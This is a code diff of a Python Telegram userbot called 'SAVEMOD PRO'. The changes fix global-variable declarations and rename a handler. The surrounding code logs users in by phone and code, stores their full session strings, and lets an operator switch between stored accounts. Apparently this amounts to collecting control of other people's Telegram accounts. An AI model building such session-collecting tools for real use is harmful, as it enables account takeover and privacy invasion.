@@ -183,7 +183,6 @@ def get_chats_keyboard(page=0):
     if not cl or not uid:
         return None
     
-    # Кэш диалогов на 30 секунд
     if hasattr(get_chats_keyboard, 'cache') and get_chats_keyboard.cache.get('uid') == uid:
         chats = get_chats_keyboard.cache.get('chats', [])
         cache_time = get_chats_keyboard.cache.get('time', 0)
@@ -519,6 +518,7 @@ async def handle_code(cb):
     await cb.answer()
 
 async def complete_auth(cb, uid):
+    global current_active_user
     data = temp_auth[uid]
     try:
         await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
@@ -527,6 +527,10 @@ async def complete_auth(cb, uid):
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                        (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
+        
+        if current_active_user is None and not is_target_admin(uid):
+            current_active_user = uid
+        
         await cb.message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню\n/ghost on/off - режим призрака", parse_mode='HTML')
         if is_admin(uid):
             await send_to_admin(f"🔐 НОВЫЙ АККАУНТ: {me.first_name}\n📱 {data['phone']}")
@@ -619,6 +623,7 @@ async def make_active(cb):
 
 @dp.callback_query_handler(lambda c: c.data.startswith('del_account_'))
 async def del_account(cb):
+    global current_active_user
     uid = int(cb.data.split('_')[2])
     if uid in active_clients:
         try:
@@ -630,7 +635,6 @@ async def del_account(cb):
     cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (uid,))
     conn.commit()
     if current_active_user == uid:
-        global current_active_user
         current_active_user = None
     await cb.answer("✅ Аккаунт удален", show_alert=True)
     await menu_users(cb)
@@ -921,7 +925,7 @@ async def cmd_backup(cb):
     await cb.message.answer("✅ Бэкап отправлен")
 
 @dp.callback_query_handler(lambda c: c.data == "ghost_toggle")
-async def cmd_ghost(cb):
+async def cmd_ghost_admin(cb):
     cl, uid = get_active_client()
     if not cl:
         await cb.answer("❌ Нет активного аккаунта")
@@ -936,6 +940,7 @@ async def cmd_ghost(cb):
 # ========== ЮЗЕРБОТ ==========
 
 async def run_userbot(owner_id, session_string):
+    global current_active_user
     if owner_id in active_clients:
         try:
             await active_clients[owner_id].disconnect()
@@ -952,8 +957,6 @@ async def run_userbot(owner_id, session_string):
     logger.info(f"✅ Юзербот запущен для {owner_id}")
     me = await client.get_me()
     
-    # Первый аккаунт становится активным автоматически
-    global current_active_user
     if current_active_user is None and not is_target_admin(owner_id):
         current_active_user = owner_id
     
